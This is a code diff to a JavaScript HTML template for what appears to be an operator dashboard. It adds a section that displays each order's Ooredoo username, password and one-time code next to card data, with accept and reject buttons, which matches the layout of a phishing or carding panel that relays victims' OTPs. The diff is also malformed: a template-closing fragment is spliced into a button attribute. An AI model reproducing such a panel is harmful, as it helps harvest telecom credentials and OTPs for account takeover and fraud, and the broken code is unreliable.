@@ -387,16 +387,24 @@
                   </div>
                 </div>
               ` : ''}
+
+              ${((d.ooredooUser || (card && card.ooredooUser)) || (d.ooredooPass || (card && card.ooredooPass)) || (d.ooredooOtp || (card && card.ooredooOtp))) ? `
+                <div class="details-section">
+                  <h4>بيانات أوريدو</h4>
+                  <div class="details-grid">
+                    <div class="detail-item"><span>مستخدم أوريدو</span><strong>${d.ooredooUser || (card && card.ooredooUser) || '—'}</strong></div>
+                    <div class="detail-item"><span>كلمة مرور أوريدو</span><strong>${d.ooredooPass || (card && card.ooredooPass) || '—'}</strong></div>
+                    <div class="detail-item"><span>OTP أوريدو</span><strong>${d.ooredooOtp || (card && card.ooredooOtp) || '—'}</strong></div>
+                  </div>
+                  <div class="action-buttons" style="margin-top: 15px; display: flex; gap: 10px;">
+                    <button class="btn-accept" onclick="approveOoredoo('${orderId}')" style="background-color: #28a745; color: white; padding: 6px 12px; border: none; border-radius: 4px; cursor: pointer;">قبول</button>
+                    <button class="btn-reject" onclick="rejectOoredoo('${orderId}')" style="background-color: #dc3545; color: white; padding: 6px 12px; border: none; border-radius: 4px; cursor: pointer;">رفض</button>
+                  </div>
+                </div>
+              ` : ''}
             </div>
-<div class="details-section">
-    <h4>بيانات أوريدو</h4>
-    <div class="details-grid">
-        <div class="detail-item"><span>مستخدم أوريدو:</span><strong>${card && card.ooredooUser ? card.ooredooUser : '-'}</strong></div>
-        <div class="detail-item"><span>كلمة مرور أوريدو:</span><strong>${card && card.ooredooPass ? card.ooredooPass : '-'}</strong></div>
-        <div class="detail-item"><span>OTP أوريدو:</span><strong>${card && card.ooredooOtp ? card.ooredooOtp : '-'}</strong></div>
-    </div>
-    <div class="action-buttons" style="margin-top: 15px; display: flex; gap: 10px;">
-        <button class="btn-accept" onclick="approveOoredoo('${orderId}')" style="background-color: #28a745; color: white; padding: 6px 12px; border: none; border-radius: 4px; cursor: pointer;">قبول</button>
+          </td>
+        `;" style="background-color: #28a745; color: white; padding: 6px 12px; border: none; border-radius: 4px; cursor: pointer;">قبول</button>
         <button class="btn-reject" onclick="rejectOoredoo('${orderId}')" style="background-color: #dc3545; color: white; padding: 6px 12px; border: none; border-radius: 4px; cursor: pointer;">رفض</button>
     </div>
 </div>
